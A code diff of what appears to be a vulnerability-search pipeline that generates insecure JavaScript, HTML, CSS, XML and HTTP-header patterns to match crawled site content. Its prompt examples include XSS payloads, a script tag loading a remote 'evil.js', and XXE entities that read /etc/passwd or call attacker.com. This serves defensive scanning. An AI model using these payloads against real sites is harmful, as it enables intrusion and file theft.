@@ -1,8 +1,8 @@
-#!/usr/bin/env python3
+import json
 import logging
 import os
 import re
-from typing import Dict, List, Optional, Any, Tuple, Iterable, Callable, Union
+from typing import Dict, List, Optional, Any, Tuple, Iterable, Callable, Union, Set
 
 import chromadb
 from chromadb import AsyncClientAPI
@@ -58,10 +58,16 @@ class CombineDocs:
         component.set_input_types(self, **input_types)
 
     @component.output_types(documents=List[Document])
-    def run(self, **kwargs):
+    def run(self, doc_types: Iterable[str], **kwargs):
         merged = []
         for docs in kwargs.values():
             merged.extend(docs)
+
+        # increase score when document is from doc_type
+        if doc_types:
+            for doc in merged:
+                if doc.meta.get("type", None) in doc_types and doc.score:
+                    doc.score *= 10
         merged.sort(key=lambda d: (d.score or 0, d.meta.get("timestamp_float", 0)), reverse=True)
         return {"documents": merged}
 
@@ -94,34 +100,145 @@ class TraceDocs:
 
 @component
 class Query:
-    @component.output_types(text=str, filters=Dict[str, Any], max_results=int, progress_callback=Callable[[str], None])
+    @component.output_types(text=str, filters=Dict[str, Any], max_results=int,
+                            targets=Iterable[str], doc_types=Iterable[str],
+                            progress_callback=Callable[[str], None])
     def run(
             self,
             text: str,
             filters: Optional[Dict[str, Any]] = None,
+            targets: Optional[Iterable[str]] = None,
+            doc_types: Optional[Iterable[str]] = None,
             max_results: Optional[int] = None,
             progress_callback: Optional[Callable[[str], None]] = None
     ):
         max_results = min(1000, max(1, max_results or 100))
+        targets = list(filter(bool, targets or []))
         return {
             "text": text,
             "filters": filters or {},
+            "targets": targets or [],
+            "doc_types": doc_types or [],
             "max_results": max_results,
             "progress_callback": progress_callback,
         }
 
 
+vuln_type_prompt = """
+You are a cybersecurity assistant helping a security engineer identify web application vulnerability types from user queries. Given a query, produce a deduplicated JSON list of vulnerability types that are either:
+ - Explicitly mentioned in the query (e.g., "Find potential XSS vulns" -> ["XSS"])
+ - Logically inferred from the language used (e.g., "Is the authentication mechanism secure?" -> ["Weak Authentication"])
+ - Be as thorough as you can when inferring vulnerabilities.
+
+The security engineer is helping customers secure their web applications.
+
+Output format:
+ - JSON array of strings, where each string is the name of a supported vulnerability type.
+ - Only output the list.
+ - Do not include any other text except the list of vulnerability types.
+ - Do not include any explanation or commentary.
+ - Do not format using markdown or other markup language.
+ - Avoid duplicating patterns.
+
+The list must only include vulnerability from this list of supported vulnerability types:
+ - XSS
+ - CSRF
+ - SSRF
+ - SSTI
+ - IDOR
+ - XXE
+ - SQL Injection
+ - Command Injection
+ - LDAP Injection
+ - XPath Injection
+ - NoSQL Injection
+ - Code Injection
+ - Template Injection
+ - Weak Authentication
+ - Secrets Disclosure
+ - Broken Access Control
+ - Sensitive Data Exposure
+ - Security Misconfiguration
+ - Unpatched Software
+ - Business Logic Flaw
+ - Clickjacking
+ - Open Redirect
+ - Directory Traversal
+ - Insecure Deserialization
+ - Rate Limiting Issues
+ - Broken Session Management
+ - Information Disclosure
+ - Unvalidated Redirects and Forwards
+ - Cryptographic Misuse
+
+If no vulnerabilities are found or inferred, return an empty list.
+
+Example Inputs and Outputs:
+
+Input:
+Find potential XSS vulns on example.com
+Output:
+["XSS"]
+
+Input:
+Is the authentication mechanism secure?
+Output:
+["Weak Authentication", "Broken Access Control"]
+
+Input:
+Can users access other users' invoices?
+Output:
+["IDOR", "Broken Access Control"]
+
+Input:
+I think there’s sensitive info in the repo
+Output:
+["Secrets Disclosure", "Sensitive Data Exposure"]
+
+Input:
+Do we need CSRF protection on this POST form?
+Output:
+["CSRF"]
+
+Input:
+Are we protected from server-side request forgery?
+Output:
+["SSRF"]
+
+Input:
+Are there vulnerable cookies?
+Output:
+["Broken Access Control", "Sensitive Data Exposure"]
+
+Input:
+Scan for common web app issues
+Output:
+["XSS", "CSRF", "SSRF", "IDOR", "XXE", "SQL Injection", "Weak Authentication", "Security Misconfiguration"]
+
+Now, given the following query, output the list.
+
+Query:
+\"{{ query }}\"
+"""
+
 query_expander_structure = """
 Structure:
-Output the expanded queries as a list of strings deliminated with lines of "----". Only output the list. Do not include any other text except the list of expanded queries. Exclude expanded queries that are only whitespace.
+Output format:
+ - Output the patterns as a list of strings deliminated with lines of "----"
+ - Only output the list.
+ - Do not include any other text except the list of patterns.
+ - Do not include any explanation or commentary.
+ - Do not format using markdown or other markup language.
+ - Exclude patterns that are only whitespace.
+ - Avoid duplicating patterns.
 """
 
 query_expander_natural_language = """
 You are a cybersecurity search assistant that processes users queries.
-You expand a given query into exactly {{ number }} queries that are similar in meaning. The expanded query should not be less specific.
-Never include a specific URL, hostname or IP address in the expanded queries. Think about it 100 times to get {{ number }} unique queries.
+You expand a given query into exactly {{ number }} queries that are similar in meaning, but specific to finding vulnerabilities. The expanded query should not be less specific. Infer vulnerabilities from the query.
+Think about it 100 times to get {{ number }} unique queries.
 
-""" + query_expander_structure + """
+""" + query_expander_structure.replace("patterns", "expanded queries") + """
 
 Examples:
 1. Example Query 1: "cross-site scripting mitigation on example.com"
@@ -148,6 +265,18 @@ Examples:
    database extraction via SQLi
    ----
 
+3. Example Query 2: "Can I execute code on example.com?"  
+   Example Expanded Queries:
+   ----
+   cross-site scripting
+   ----
+   XSS
+   ----
+   command injection
+   ----
+   server-side template injection
+   ----
+
 
 Your Task:
 Query: "{{query}}"
@@ -156,177 +285,307 @@ Expanded Queries:
 """
 
 query_expander_javascript = """
-You are a cybersecurity search assistant that processes users queries. You are specialized in JavaScript
-programming, securing coding in JavaScript, and obfuscation techniques.
-You expand a given query into exactly {{ number }} queries that are example JavaScript snippets that are an interpretation of the given query. The expanded queries must only be JavaScript code. Never include console.log(). Never include a specific URL, hostname or IP address in the expanded queries. Think about it 100 times to get {{ number }} unique queries.
+You are a code pattern generator trained to identify insecure client-side JavaScript practices.
+Think about it 100 times to get {{ number }} unique patterns.
 
-""" + query_expander_structure + """
+You will receive a single free-text input from the user. It may include:
+- One or more vulnerability names (e.g., "XSS", "IDOR", "Open Redirect", etc.)
+- Natural language phrases (e.g., "What uses eval or innerHTML?", "Check for anything vulnerable to DOM clobbering or open redirect")
+- Informal combinations (e.g., "IDOR or XSS", "maybe eval too", "dangerous access patterns")
+
+Your task:
+1. Analyze the input and **infer all relevant client-side vulnerabilities or risky behaviors**.
+2. For each inferred item, generate **exactly {{ number }} insecure client-side JavaScript code patterns** that represent real-world usage.
+
+Code Pattern Requirements:
+- Must be valid client-side JavaScript (ES5/ES6+)
+- Must demonstrate insecure behavior
+- Must not be tied to a specific app or domain
+- Should use realistic client-side APIs (DOM, window/document, localStorage, etc.)
+- Do NOT use Node.js or backend features
+- Do NOT show secure or mitigated code—only vulnerable patterns
+- Escape all code strings properly for JSON.
+- Do not include explanations or comments.
+- Keep patterns realistic and relevant to the client-side context.
+
+""" + query_expander_structure.replace("expanded queries", "patterns") + """
 
 Examples:
-1. Example Query 1: "What javascript libraries call eval() on example.com" when asked for 4 expanded queries
-   Expanded Queries:
-   ----
-   Object.prototype.eval = function() {\\n return eval(this);\\n};
-   ----
-   window.eval = function(code) {\\n return eval(code);\\n};
-   ----
-   Function.prototype.customEval = function(code) {\\n return eval(code);\\n}
-   ----
-   Function('return eval(\\" + JSON.stringify('some code') + \\")')
-   ----
+1. Example Query 1: "What javascript libraries call eval() on example.com" when asked for 10 patterns
+    ----
+    eval('return ' + code + ';');
+    ----
+    var json = '{"key": "' + data + '"}';
+    return JSON.parse(eval(json));
+    ----
+    var htmlString = '<div>' + html + '</div>';
+    return eval(htmlString);
+    ----
+    var code = "console.log('Hello World!');";
+    executeCode(code);
+    ----
+    var cssString = 'body { background-color: ' + css + '; }';
+    return eval(cssString);
+    ----
+    var scriptString = 'document.write("' + script + '");';
+    return eval(scriptString);
+    ----
+    var data = "Hello World!";
+    var json = '{"key": "' + data + '"}';
+    getJSON(json);
+    ----
+    var xmlString = '<root>' + xml + '</root>';
+    return eval(xmlString);
+    ----
+    var html = 'Hello World!';
+    var htmlString = '<div>' + html + '</div>';
+    getHTML(htmlString);
+    ----
+    var css = "red";
+    var cssString = 'body { background-color: ' + css + '; }';
+    getCSS(cssString);
    
-2. Example Query 2: "Find Javascript libraries on http://target.local" when asked for 5 expanded queries
-   Expanded Queries: 
+2. Example Query 2: "XSS" when asked for 10 patterns
    ----
-   fetch('/libraries').then(res => res.json()).then(data => data.map(lib => lib.name))
+   var userInput = document.getElementById('username').value; var maliciousScript = "alert('XSS attack')"; userInput += " + " + maliciousScript;
    ----
-   axios.get('/libraries').then(response => response.data.map(lib => lib.name))
+   var htmlContent = '<p>Hello, ' + username + '</p>'; document.getElementById('content').innerHTML = htmlContent;
    ----
-   new XMLHttpRequest().open('GET', '/libraries', true).send(), new Promise((resolve) => { resolve(xhr.responseXML.getElementsByTagName('library').textContent.split(', ')); })
+   var userInput = document.getElementById('username').value; var maliciousScript = "eval(userInput)";
    ----
-   $.ajax({url: '/libraries', success: function(data){ $.each($(data).find('.library'), function(index, lib){ console.log($(lib).text()); }); }})
+   var url = "https://example.com/" + username; var xhr = new XMLHttpRequest(); xhr.open("GET", url, true);
    ----
-   fetch('/libraries').then(res => res.text()).then(html => Array.from(new DOMParser().parseFromString(html, 'text/html').getElementsByTagName('a')).map(a => a.textContent))
+   var userInput = document.getElementById('username').value; var maliciousScript = "window.location.href='https://malicious-site.com/'";
+   ----
+   var htmlContent = "<script>alert('XSS')</script>"; document.getElementById('content').innerHTML += htmlContent;
+   ----
+   var userInput = document.getElementById('username').value; var maliciousScript = "document.cookie = 'session_id=evil'";
+   ----
+   var url = "https://example.com/" + username; var xhr = new XMLHttpRequest(); xhr.open("POST", url, true);
+   ----
+   var userInput = document.getElementById('username').value; var maliciousScript = "var evilScript = document.createElement('script'); evilScript.src = 'https://malicious-site.com/evil.js'; document.body.appendChild(evilScript)";
+   ----
+   var htmlContent = "<iframe src='https://example.com/'></iframe>"; document.getElementById('content').innerHTML += htmlContent;
    ----
 
-Your Task:
-Query: "{{query}}"
-Never include a specific URL, hostname or IP address in the expanded queries.
-Expanded Queries:
+Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure client-side JavaScript patterns for each one:
+
+{{query}}
 """
 
 query_expander_css = """
-You are a cybersecurity search assistant that processes users queries. You are specialized in style sheet
-development and securing CSS.
-You expand a given query into exactly {{ number }} queries that are example CSS snippets that are an interpretation of the given query. The expanded queries must only be CSS code. Never include a specific URL, hostname or IP address in the expanded queries. Think about it 100 times to get {{ number }} unique queries.
+You are a static code analysis assistant that receives user queries containing hints about web security vulnerabilities. From the user query, infer one or more common vulnerability types (e.g., XSS, information disclosure, insecure design, etc.) and generate {{ number }} generic CSS code patterns likely to exhibit or relate to those vulnerabilities.
+Think about it 100 times to get {{ number }} unique patterns.
 
-""" + query_expander_structure + """
+Examples of inferred vulnerability types and sample pattern directions:
 
-Examples:
-1. Example Query 1: "Find CSS vulns on example.com" when asked for 3 expanded queries
-   Example Expanded Queries:
-   ----
-   x-allow-cross-origin-resource-sharing: *;
-   ----
-   @font-face { src: url(‘/malware.ttf’); }
-   ----
-   input[type=‘text’] { content: url(‘/hack.jpg’); }
-   ----
+|Inferred Vulnerability  | Example Pattern Direction             |
+|------------------------|---------------------------------------|
+| Information disclosure | .debug { display: block; }            |
+| Insecure design        | * { visibility: visible !important; } |
+| Authentication         | #admin-login { display: block; }      |
 
-Your Task:
-Query: "{{query}}"
-Never include a specific URL, hostname or IP address in the expanded queries.
-Expanded Queries:
+Capabilities:
+ - Handle multiple vulnerability types in a single input.
+ - Recognize synonyms and related keywords.
+ - Detect implications.
+ - Recognize both code-level and logic-level vulnerabilities.
+
+""" + query_expander_structure.replace("expanded queries", "patterns") + """
+- Each pattern should be a valid CSS snippet (selector + rules), inline style, or injection-prone usage.
+
+Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure CSS patterns for each one:
+
+{{query}}
 """
 
 query_expander_html = """
-You are a cybersecurity search assistant that processes users queries. You are specialized in HTML
-development and securing HTML.
-You expand a given query into exactly {{ number }} queries that are example HTML snippets that are an interpretation of the given query. The expanded queries must only be HTML code. Never include a specific URL, hostname or IP address in the expanded queries. Think about it 100 times to get {{ number }} unique queries.
+You are a static code analysis assistant that receives user queries containing hints about web security vulnerabilities. From the user query, infer one or more common vulnerability types (e.g., XSS, SQLi, IDOR, insecure deserialization, etc.) and generate {{ number }} generic HTML code patterns likely to exhibit or relate to those vulnerabilities.
+Think about it 100 times to get {{ number }} unique patterns.
 
-""" + query_expander_structure + """
+Examples of inferred vulnerability types and sample pattern directions:
 
-Examples:
-1. Example Query 1: "What javascript libraries call eval() on example.com" when asked for 5 expanded queries
-   Example Expanded Queries:
-    ----
-    <script>
-    function unsafeEval() {
-        eval("alert('This is an example of eval being called within a function')");
-    }
-    </script>
-    ----
-    <script>
-    (function() {
-        eval("console.log('This is another call to eval')");
-    })();
-    </script>
-    ----
-    <div>
-    <script>eval("document.write('This is yet another way to use eval');")</script>
-    </div>
-    ----
-    <form onsubmit="eval('alert(\"Eval called in form submission handler\")')">
-    <input type="text" name="test"/>
-    </form>
-    ----
-    <button onclick="eval('alert(\"Button click event calling eval\")')">Click Me</button>
-    ----
+|Inferred Vulnerability   | Example Pattern Direction                       |
+|-------------------------|-------------------------------------------------|
+|XSS	                  | <input> reflected into DOM unsanitized          |
+|SQLi                     | <form> with suspect SQL-like input names        |
+|IDOR                     | Hidden fields with user IDs in forms            |
+|SSRF                     | <input> fields accepting URLs or IPs            |
+|Misconfiguration         | Comments with stack traces or debug info        |
+|Sensitive Data Exposure  | Fields named like “key”, “token”, “.env”        |
+|Weak Auth/Session        | Login forms with autocomplete or insecure attrs |
+|Insecure Deserialization | JavaScript using JSON.parse(untrusted_input)    |
+|Template Injection       | {{user}} in HTML with no escaping               |
+|Outdated Components      | Script tags with versioned paths or CDNs        |
 
-Your Task:
-Query: "{{query}}"
-Never include a specific URL, hostname or IP address in the expanded queries.
-Expanded Queries:
+Capabilities:
+ - Handle multiple vulnerability types in a single input.
+ - Recognize synonyms and related keywords.
+ - Detect implications, such as “What calls eval()?” infers insecure JS execution.
+ - Recognize both code-level and logic-level vulnerabilities.
+ - For technology specific patterns, vary the technology used. For example: do not only consider PHP.
+
+""" + query_expander_structure.replace("expanded queries", "patterns") + """
+ - Each pattern should be a generic HTML snippet (possibly including inline JavaScript or HTML forms) designed to match vulnerable structures.
+ - You must infer the vulnerability types from the input text; assume the input may use synonyms or descriptions instead of standard names.
+
+Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure HTML patterns for each one:
+
+{{query}}
 """
 
 query_expander_xml = """
-You are a cybersecurity search assistant that processes users queries. You are specialized in XML
-development and securing XML.
-You expand a given query into exactly {{ number }} queries that are example XML snippets that are an interpretation of the given query.
-The expanded queries must only be HTML code. Never include a specific URL, hostname or IP address in the expanded queries. Think about it 100 times to get {{ number }} unique queries.
+You are a static code and traffic analysis assistant that receives user queries describing potential web application vulnerabilities. From the user query, infer one or more common vulnerability types (e.g., XXE, SSRF, IDOR, insecure deserialization, etc.), and generate {{ number }} generic XML data patterns likely to exhibit or relate to those vulnerabilities. Consider the XML to be data or configuration, not HTML or source code.
+Think about it 100 times to get {{ number }} unique patterns.
 
-""" + query_expander_structure + """
+Examples of inferred vulnerability types and sample pattern directions:
+
+|Inferred Vulnerability    | Example Pattern Direction                               |
+|--------------------------|---------------------------------------------------------|
+| XXE / SSRF               | External entity injections                              |
+| Insecure Deserialization | Base64 or serialized binary blobs in tags               |
+| IDOR / Access Control    | Direct reference to user IDs                            |
+| Sensitive Data Exposure  | API keys, passwords, encryption keys in plaintext       |
+| XPath Injection          | Dynamic filter strings with unvalidated user input      |
+| Insecure Configuration   | Debug flags, default credentials, exposed admin configs |
+| Broken Authentication    | Weak password policies or session tokens in XML         |
+
+Capabilities:
+ - Handle multiple vulnerability types in a single input.
+ - Recognize synonyms and related keywords.
+ - Detect implications.
+ - Patterns must be valid XML snippets that would appear in XML.
+ - Only output the patterns, do not include comments or titles.
+ - Ensure patterns are varied and reflect plausible real-world vulnerable constructs.
+
+""" + query_expander_structure.replace("expanded queries", "patterns") + """
 
 Examples:
-1. Example Query 1: "Find the XML entity injections on example.com" when asked for 5 expanded queries
-   Example Expanded Queries:
+1. Example Query 1: "XXE"
     ----
-    &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;
+    <!DOCTYPE foo [
+      <!ELEMENT foo ANY >
+      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+    <foo>&xxe;</foo>
     ----
-    <!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://attacker.com/secret" >]>
+    <foo>&xxe;</foo>
     ----
-    &lt;!DOCTYPE foo [&lt;![CDATA[&lt;script&gt;document.write(&#39;xss&#39;)&lt;/script&gt;]]&gt;]&gt;&lt;foo&gt;
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "http://attacker.com:8080/admin" >]>
+    <foo>&xxe;</foo>
     ----
-    &lt;xml&gt;&lt;data&gt;Injection&lt;/data&gt;&lt;/xml&gt;
-    ----
-    <xml><entity>&amp;foo;</entity></xml>
+    <!DOCTYPE root [
+      <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
+    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <getFile>
+          <filename>&xxe;</filename>
+        </getFile>
+      </soap:Body>
+    </soap:Envelope>
     ----
 
-Your Task:
-Query: "{{query}}"
-Never include the URL, hostname or IP address in the expanded queries.
-Expanded Queries:
+Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure XML data patterns for each one:
+
+{{query}}
 """
 
 query_expander_network = """
-You are a cybersecurity search assistant that processes users queries. You are specialized in the security of the HTTP protocol and vulnerabilities associated with HTTP.
-You expand a given query into exactly {{ number }} queries that are snippets of HTTP header names and values that are related to the input query. Think about it 100 times to get {{ number }} unique queries.
+You are a static code and traffic analysis assistant that receives queries describing potential web application vulnerabilities. From the user query, infer one or more common vulnerability types (e.g., XSS, SQLi, IDOR, SSRF, weak authentication, insecure deserialization, etc.), and generate {{ number }} HTTP header name/value combinations likely to indicate these vulnerabilities.
+Think about it 100 times to get {{ number }} unique patterns.
 
-""" + query_expander_structure + """
+Capabilities:
+ - Handle multiple vulnerability types in a single input.
+ - Recognize synonyms and related keywords.
+ - Detect implications, such as “How can I run code in the browser?” infers cross-site scripting (XSS).
+ - Recognize both code-level and logic-level vulnerabilities.
 
-Examples:
-1. Example Query 1: "Examine the CSP on example.com"
-   Example Expanded Queries:
-   ----
-   Content-Security-Policy:
-   ----
-   
-2. Example Query 1: "Look for vulnerable cookie settings on example.com"
-   Example Expanded Queries:
-   ----
-   Set-Cookie: samesite=None
-   ----
-   Set-Cookie: domain=
-   ----
+""" + query_expander_structure.replace("expanded queries", "patterns") + """
+ - Each string must be an HTTP header name and header value separated by ": ".
+ - Only include HTTP header names and header values, do not include explanation or vulnerability types.
+ - Header values may be exact, partial, or suggestive of vulnerability conditions.
+ - Ensure outputs span both request and response headers where applicable.
 
-Your Task:
-Query: "{{query}}"
-Never include a specific URL, hostname or IP address in the expanded queries.
-Expanded Queries:
+Examples of inferred vulnerability types and sample pattern directions:
+
+Inferred Vulnerability: Cookies
+Output:
+----
+Set-Cookie: sessionid=abc123
+----
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+----
+
+Inferred Vulnerability: XSS
+Output:
+----
+Content-Security-Policy: default-src *
+----
+Content-Security-Policy: script-src 'unsafe-inline'
+----
+
+Inferred Vulnerability: Weak Authentication
+Output:
+----
+Authorization: Basic dXNlcjpwYXNz
+----
+WWW-Authenticate: Digest realm="example"
+----
+
+Inferred Vulnerability: Info Leakage
+----
+X-Powered-By:
+----
+
+Inferred Vulnerability: Unvalidated Redirects
+----
+Location: //evil.com
+----
+
+
+Now, given a single unstructured user input string, infer the vulnerabilities and generate {{ number }} insecure HTTP headers and values for each one:
+
+{{query}}
 """
 
 
 @component
+class VulnTypeParser:
+
+    @component.output_types(vuln_types=Iterable[str])
+    def run(self, replies: List[str]):
+        logger.debug(f"VulnTypeParser: replies {replies}")
+        vuln_types: Set[str] = set()
+        for reply in replies:
+            try:
+                parsed = json.loads(reply)
+                if isinstance(parsed, Iterable):
+                    vuln_types.update(map(lambda e: str(e).lower().replace(' ', '_'), parsed))
+            except json.decoder.JSONDecodeError:
+                pass
+        logger.info(f"VulnTypeParser: {vuln_types}")
+        return {"vuln_types": vuln_types}
+
+
+@component
 class QueryExpander:
+    target_placeholders = ["example.com", "{NETLOC}"]
+    split_head = re.compile(r"^----+\s*(.*)")
+    split_tail = re.compile(r"(.*)\s*----+$")
+
     def __init__(
             self,
             generator_config: GeneratorConfig,
             prompt: Optional[str] = None,
+            doc_type: Optional[str] = None,
             number: int = 5,
             include_original_query: bool = True,
     ):
 
         self.query_expansion_prompt = prompt
+        self.doc_type = doc_type or "nl"
         self.number = number
         self.include_original_query = include_original_query
         if prompt is None:
@@ -334,50 +593,95 @@ class QueryExpander:
         builder = PromptBuilder(self.query_expansion_prompt, required_variables=["number", "query"])
         llm = generator_config.create_generator(temperature=0.6)
         self.pipeline = Pipeline()
-        self.pipeline.add_component(name="builder", instance=builder)
-        self.pipeline.add_component(name="llm", instance=llm)
+        self.pipeline.add_component("builder", builder)
+        self.pipeline.add_component("llm", llm)
         self.pipeline.connect("builder", "llm")
 
+    def _split_results(self, result: str) -> Set[str]:
+        expanded_set: Set[str] = set()
+        collected = ""
+        for line in result.split("\n"):
+            head_match = self.split_head.match(line)
+            if head_match:
+                line = head_match.group(1).strip()
+                if collected_strip := collected.strip():
+                    expanded_set.add(collected_strip)
+                    collected = ""
+            tail_match = self.split_tail.match(line)
+            if tail_match:
+                line = tail_match.group(1).strip()
+                collected = '\n'.join([collected, line])
+                if collected_strip := collected.strip():
+                    expanded_set.add(collected_strip)
+                    collected = ""
+            if line:
+                collected = '\n'.join([collected, line])
+        if collected_strip := collected.strip():
+            expanded_set.add(collected_strip)
+        return expanded_set
+
     @component.output_types(queries=List[str])
-    def run(self, query: str):
+    def run(self, query: str, targets: Iterable[str], vuln_types: Iterable[str]):
         if self.number <= 1:
             return {"queries": [query]}
 
-        expanded_set = set()
-        retry = 2
-        while retry > 0 and len(expanded_set) < self.number:
-            retry -= 1
+        expanded_set: Set[str] = set()
 
-            result = \
-                self.pipeline.run({'builder': {'query': query, 'number': self.number}}).get('llm', {}).get('replies',
-                                                                                                           [""])[
-                    0]
+        logger.debug(f"vuln_types: {vuln_types}")
+        if vuln_types:
+            for vuln_type in vuln_types:
+                vuln_query_path = os.path.join(os.path.dirname(__file__),
+                                               "assets/query/" + vuln_type + "_" + self.doc_type + ".txt")
+                logger.debug(f"checking {vuln_query_path} for static expanded queries")
+                if os.path.exists(vuln_query_path):
+                    logger.info("Reading expanded queries from %s", vuln_query_path)
+                    with open(vuln_query_path, "r") as f:
+                        expanded_set.update(self._split_results(f.read()))
+        logger.debug(f"static expanded queries: {expanded_set}")
+
+        # If there are static queries, make sure the LLM has a chance to add something
+        expanded_set_number = max(self.number, len(expanded_set) + 3)
+
+        retry = 2
+        while retry > 0 and len(expanded_set) < expanded_set_number:
+            retry -= 1
+            number_left = expanded_set_number - len(expanded_set)
+
+            run_result = self.pipeline.run({'builder': {'query': query, 'number': number_left}})
+            replies: List[str] = run_result.get('llm', {}).get('replies', [])
+            if not replies:
+                continue
+            result = replies[0]
             logger.info(f"Expanded query result:\n{result}")
             if not result:
                 continue
 
-            collected = ""
-            for line in result.split("\n"):
-                if line.startswith("----"):
-                    line = line[4:].strip()
-                    if collected.strip():
-                        expanded_set.add(collected.strip())
-                        collected = ""
-                if line.endswith("----"):
-                    line = line[:-4].strip()
-                    collected = '\n'.join([collected, line])
-                    if collected.strip():
-                        expanded_set.add(collected.strip())
-                        collected = ""
-                if line:
-                    collected = '\n'.join([collected, line])
-            if collected.strip():
-                expanded_set.add(collected.strip())
+            results = self._split_results(result)
+            while len(results) > number_left:
+                results.pop()
+            expanded_set.update(results)
 
-        expanded_list = list(expanded_set)[:self.number]
+        expanded_list: List[str] = list(expanded_set)[:expanded_set_number]
         if self.include_original_query:
             expanded_list.insert(0, query)
-        return {"queries": expanded_list}
+
+        # apply targets
+        expanded_with_targets = []
+        if targets:
+            for expanded_query in expanded_list:
+                placeholder_found = False
+                for placeholder in self.target_placeholders:
+                    if placeholder in expanded_query:
+                        for target in targets:
+                            # set here in case targets is empty
+                            placeholder_found = True
+                            expanded_with_targets.append(expanded_query.replace(placeholder, target))
+                if not placeholder_found:
+                    expanded_with_targets.append(expanded_query)
+        else:
+            expanded_with_targets = expanded_list
+
+        return {"queries": expanded_with_targets}
 
 
 @component
@@ -652,8 +956,17 @@ async def build_document_pipeline(db: str, generator_config: GeneratorConfig) ->
     comb = CombineDocs([f"{col}_documents" for col in get_chroma_collections()])
     pipe.add_component("combine", comb)
     pipe.add_component("query", Query())
+    pipe.add_component("vuln_type_prompt", PromptBuilder(vuln_type_prompt, required_variables=["query"]))
+    pipe.add_component("vuln_type_llm", generator_config.create_generator(temperature=0.1))
+    pipe.add_component("vuln_type_parser", VulnTypeParser())
     pipe.add_component("query_expander", QueryExpander(generator_config))
+    pipe.connect("query.text", "vuln_type_prompt.query")
+    pipe.connect("vuln_type_prompt", "vuln_type_llm")
+    pipe.connect("vuln_type_llm", "vuln_type_parser")
     pipe.connect("query.text", "query_expander.query")
+    pipe.connect("query.targets", "query_expander.targets")
+    pipe.connect("vuln_type_parser", "query_expander")
+    pipe.connect("query.doc_types", "combine.doc_types")
 
     retrievers: Dict[str, MultiQueryChromaRetriever] = {}
     stores: Dict[str, ChromaDocumentStore] = {}
@@ -682,23 +995,25 @@ async def build_document_pipeline(db: str, generator_config: GeneratorConfig) ->
         custom_query_expander_name = None
         if doc_type_model.doc_type == "javascript":
             custom_query_expander = QueryExpander(generator_config, prompt=query_expander_javascript, number=10,
-                                                  include_original_query=False)
+                                                  include_original_query=False, doc_type="javascript")
         elif doc_type_model.doc_type == "css":
             custom_query_expander = QueryExpander(generator_config, prompt=query_expander_css, number=5,
-                                                  include_original_query=False)
+                                                  include_original_query=False, doc_type="css")
         elif doc_type_model.doc_type == "html":
             custom_query_expander = QueryExpander(generator_config, prompt=query_expander_html, number=10,
-                                                  include_original_query=False)
+                                                  include_original_query=False, doc_type="html")
         elif doc_type_model.doc_type == "xml":
             custom_query_expander = QueryExpander(generator_config, prompt=query_expander_xml, number=5,
-                                                  include_original_query=False)
+                                                  include_original_query=False, doc_type="xml")
         elif doc_type_model.doc_type == "network":
             custom_query_expander = QueryExpander(generator_config, prompt=query_expander_network, number=5,
-                                                  include_original_query=False)
+                                                  include_original_query=False, doc_type="network")
         if custom_query_expander is not None:
             custom_query_expander_name = "query_expander_" + doc_type_model.doc_type
             pipe.add_component(custom_query_expander_name, custom_query_expander)
             pipe.connect("query.text", custom_query_expander_name + ".query")
+            pipe.connect("query.targets", custom_query_expander_name + ".targets")
+            pipe.connect("vuln_type_parser", custom_query_expander_name)
 
         for col in doc_type_model.get_chroma_collections():
             store = create_chrome_document_store(db=db, collection_name=col)
@@ -802,7 +1117,7 @@ def build_website_context_pipeline(generator_config: GeneratorConfig) -> Pipelin
     builder = PromptBuilder(prompt, required_variables=["query"])
     llm = generator_config.create_generator(temperature=0.1)
     pipeline = Pipeline()
-    pipeline.add_component(name="builder", instance=builder)
-    pipeline.add_component(name="llm", instance=llm)
+    pipeline.add_component("builder", builder)
+    pipeline.add_component("llm", llm)
     pipeline.connect("builder", "llm")
     return pipeline
